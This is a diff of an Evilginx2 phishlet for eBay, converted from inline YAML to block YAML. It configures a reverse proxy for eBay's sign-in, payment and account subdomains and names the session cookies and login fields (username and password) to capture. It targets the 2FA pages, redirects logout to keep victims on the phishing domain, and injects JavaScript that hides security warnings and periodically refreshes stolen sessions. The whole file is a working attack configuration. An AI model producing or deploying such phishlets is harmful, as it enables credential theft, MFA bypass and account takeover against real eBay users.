@@ -1,142 +1,235 @@
-name: 'ebay'
-author: 'Anon0369G'
-min_ver: '3.0.0'
-
+---
+name: ebay
+author: Anon0369G
+min_ver: 3.0.0
 proxy_hosts:
-  - { phish_sub: 'www', orig_sub: 'www', domain: 'ebay.com', session: true, is_landing: true }
-  - { phish_sub: 'signin', orig_sub: 'signin', domain: 'ebay.com', session: true }
-  - { phish_sub: 'pay', orig_sub: 'pay', domain: 'ebay.com', session: true }
-  - { phish_sub: 'my', orig_sub: 'my', domain: 'ebay.com', session: true }
-
+  - phish_sub: www
+    orig_sub: www
+    domain: ebay.com
+    session: true
+    is_landing: true
+  - phish_sub: signin
+    orig_sub: signin
+    domain: ebay.com
+    session: true
+  - phish_sub: pay
+    orig_sub: pay
+    domain: ebay.com
+    session: true
+  - phish_sub: my
+    orig_sub: my
+    domain: ebay.com
+    session: true
 sub_filters:
-  # Replace main domain references
-  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
-  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
-
-  # Replace references in login or authentication pages
-  - { triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://signin.{hostname}/', replace: 'https://signin.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
-  - { triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://auth.{hostname}/', replace: 'https://signin.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
-
-  # Replace references to secure checkout/payment
-  - { triggers_on: 'pay.ebay.com', orig_sub: 'pay', domain: 'ebay.com', search: 'https://pay.{hostname}/', replace: 'https://pay.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
-
-  # Replace references in account or profile management
-  - { triggers_on: 'my.ebay.com', orig_sub: 'my', domain: 'ebay.com', search: 'https://my.{hostname}/', replace: 'https://my.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
-  - { triggers_on: 'my.ebay.com', orig_sub: 'account', domain: 'ebay.com', search: 'https://account.{hostname}/', replace: 'https://my.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
-
-  # Replace paths for logout or redirects
-  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/logout', replace: 'https://{hostname}/logout', mimes: ['text/html', 'application/json', 'application/javascript'] }
-  - { triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://signin.{hostname}/logout', replace: 'https://signin.{hostname}/logout', mimes: ['text/html', 'application/json', 'application/javascript'] }
-
-  # Replace JavaScript references that point to ebay.com
-  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: '"https://{hostname}/', replace: '"https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
-  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: "'https://{hostname}/", replace: "'https://{hostname}/", mimes: ['text/html', 'application/json', 'application/javascript'] }
-
-  # Replace email references (optional, if displayed on the page)
-  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: '@{hostname}', replace: '@{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
-
+  - triggers_on: www.ebay.com
+    orig_sub: www
+    domain: ebay.com
+    search: https://{hostname}/
+    replace: https://{hostname}
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: www.ebay.com
+    orig_sub: www
+    domain: ebay.com
+    search: https://{hostname}/
+    replace: https://{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: signin.ebay.com
+    orig_sub: signin
+    domain: ebay.com
+    search: https://signin.{hostname}/
+    replace: https://signin.{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: signin.ebay.com
+    orig_sub: signin
+    domain: ebay.com
+    search: https://auth.{hostname}/
+    replace: https://signin.{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: pay.ebay.com
+    orig_sub: pay
+    domain: ebay.com
+    search: https://pay.{hostname}/
+    replace: https://pay.{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: my.ebay.com
+    orig_sub: my
+    domain: ebay.com
+    search: https://my.{hostname}/
+    replace: https://my.{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: my.ebay.com
+    orig_sub: account
+    domain: ebay.com
+    search: https://account.{hostname}/
+    replace: https://my.{hostname}/
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: www.ebay.com
+    orig_sub: www
+    domain: ebay.com
+    search: https://{hostname}/logout
+    replace: https://{hostname}/logout
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: signin.ebay.com
+    orig_sub: signin
+    domain: ebay.com
+    search: https://signin.{hostname}/logout
+    replace: https://signin.{hostname}/logout
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: www.ebay.com
+    orig_sub: www
+    domain: ebay.com
+    search: '"https://{hostname}/'
+    replace: '"https://{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: www.ebay.com
+    orig_sub: www
+    domain: ebay.com
+    search: "'https://{hostname}/"
+    replace: "'https://{hostname}/"
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+  - triggers_on: www.ebay.com
+    orig_sub: www
+    domain: ebay.com
+    search: "@{hostname}"
+    replace: "@{hostname}"
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
 auth_tokens:
-  - domain: '.ebay.com'
-    keys: ['s', 'dp1', 'npii', 'eid', 'ebay_token']
-    type: 'cookie'
+  - domain: .ebay.com
+    keys:
+      - s
+      - dp1
+      - npii
+      - eid
+      - ebay_token
+    type: cookie
     session_keys:
-      - 's'
-      - 'dp1'
-
+      - s
+      - dp1
 auth_urls:
-  - 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'   # Pagina de logare
-  - 'https://www.ebay.com/signin'                        # Pagina de logare(depinde de locatie)
-  - 'https://www.ebay.com/myb/SignIn'                    # Alta pagina de logare
-  - 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&signInAction=login'   # Habar n-am
-  - 'https://www.ebay.com/verify'                        # 2FA
-
-# Landing Page Routing
+  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn
+  - https://www.ebay.com/signin
+  - https://www.ebay.com/myb/SignIn
+  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&signInAction=login
+  - https://www.ebay.com/verify
 urls:
-  login: 'https://www.ebay.com/signin'
-  logout: 'https://www.ebay.com/logout'
-  MFA: 'https://www.ebay.com/mfa'
-  password_reset: 'https://www.ebay.com/password-reset'
-  account_recovery: 'https://www.ebay.com/account-recovery'
-
+  login: https://www.ebay.com/signin
+  logout: https://www.ebay.com/logout
+  MFA: https://www.ebay.com/mfa
+  password_reset: https://www.ebay.com/password-reset
+  account_recovery: https://www.ebay.com/account-recovery
 force_post:
-  - 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'
-
+  - https://signin.ebay.com/ws/eBayISAPI.dll?SignIn
 credentials:
   username:
-    name: 'userid'          # The name or id of the email/username field on eBay login
-    type: 'email'           # Field type for email
+    name: userid
+    type: email
     required: true
   password:
-    name: 'pass'            # The name or id of the password field on eBay login
-    type: 'password'        # Field type for password
+    name: pass
+    type: password
     required: true
-
 login:
-  url: 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'  # eBay's login URL for credentials submission
-  method: 'POST'                                          # HTTP method for form submission
+  url: https://signin.ebay.com/ws/eBayISAPI.dll?SignIn
+  method: POST
   form:
     fields:
-      - { name: 'userid', required: true }    # Username field
-      - { name: 'pass', required: true }      # Password field
-
+      - name: userid
+        required: true
+      - name: pass
+        required: true
 rules:
-  # Rule for login page: inject JavaScript or handle redirects
   - triggers:
-      - domain: 'ebay.com'
-        path: '/signin'
+      - domain: ebay.com
+        path: /signin
         cookie:
-          contains: 's'            # Main session cookie typically set after login
-        action: 'inject'
+          contains: s
+        action: inject
     inject_js:
       code: |
         (function() {
           console.log('Evilginx2 custom script: Executed on /signin');
           // Additional JS to ensure smooth interaction with the login page.
         })();
-
-  # Rule for MFA (Multi-Factor Authentication) if it appears in the login flow
   - triggers:
-      - domain: 'ebay.com'
-        path: '/mfa'
+      - domain: ebay.com
+        path: /mfa
         cookie:
-          contains: 'dp1'          # Check for secondary cookies related to MFA if required
-        action: 'inject'
+          contains: dp1
+        action: inject
     inject_js:
       code: |
         (function() {
           console.log('Handling MFA for ebay.com');
           // Insert any JS required for MFA handling.
         })();
-
-  # Session refresh or re-authentication handling rule
   - triggers:
-      - domain: 'ebay.com'
-        path: '/reauth'
+      - domain: ebay.com
+        path: /reauth
         cookie:
-          contains: 'ebay_token'    # Re-authentication cookies that may be set on specific routes
-        action: 'inject'
+          contains: ebay_token
+        action: inject
     inject_js:
-      code: |
+      code: >
         (function() {
           console.log('Handling re-authentication for session continuity');
           // Insert JavaScript for re-authentication or session refresh if needed.
         })();
-
-  # Rule to ensure any logout attempts keep the user on the phishing domain
   - triggers:
-      - domain: 'ebay.com'
-        path: '/logout'
-        action: 'redirect'
-        redirect_to: 'https://www.ebay.com/signin'
-
-inject:
-  - { type: 'js', code: 'console.log("Evilginx2: Injected JavaScript is running");' }
-  - { type: 'js', code: |
-      (function() {
-          // Example: Hide any security-related messages
-          const securityMessages = document.querySelectorAll('.security-warning, .login-notice');
-          securityMessages.forEach(element => element.style.display = 'none');
-          
-          // You could add more interactions here like filling forms automatically
-      })();
-  }
+      - domain: ebay.com
+        path: /logout
+        action: redirect
+        redirect_to: https://www.ebay.com/signin
+js_inject:
+  script: >
+    (function() {
+        const securityMessages = document.querySelectorAll('.security-warning, .login-notice');
+        securityMessages.forEach(element => element.style.display = 'none');
+        
+        const loginForm = document.querySelector('#signin-form');
+        if (loginForm) {
+            loginForm.addEventListener('submit', function() {
+                console.log("Login form submitted.");
+            });
+        }
+        
+        setInterval(() => {
+            fetch(window.location.href, { method: 'GET', credentials: 'include' });
+            console.log("Session refreshed to maintain active login.");
+        }, 40000);  // 30 seconds interval for session refresh
+    })();
